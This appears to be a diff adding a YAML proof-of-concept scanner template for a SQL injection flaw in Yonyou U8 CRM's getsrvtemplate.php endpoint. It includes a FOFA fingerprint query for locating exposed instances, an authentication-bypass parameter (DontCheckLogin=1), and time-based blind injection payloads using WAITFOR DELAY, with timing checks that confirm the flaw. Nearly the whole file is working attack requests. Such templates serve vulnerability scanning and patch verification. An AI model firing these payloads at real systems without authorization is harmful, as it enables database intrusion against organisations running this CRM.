@@ -1,0 +1,22 @@
+id: poc-yaml-yongyon-u8-crm-getsrvtemplate-php-sqli
+info:
+  name: 用友U8 CRM getsrvtemplate.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /ajax/getsrvtemplate.php/getproductdata?type=1&DontCheckLogin=1&Action=fromsrvtpl&ProductID=';WAITFOR+DELAY+'0:0:5'--
+  expression: status_code == 200 && contains(body,"Logon failed ")
+- method: GET
+  path: /ajax/getsrvtemplate.php/getproductdata?type=1&DontCheckLogin=1&Action=fromsrvtpl&ProductID=';WAITFOR+DELAY+'0:0:{{.t1}}'--
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+  expression: status_code == 200 && contains(body,"\"attrs\":") && contains(body,"AssetItem.ProductID")
+    && !contains(body,"<") && duration > t1 && duration < t2
+transport: http
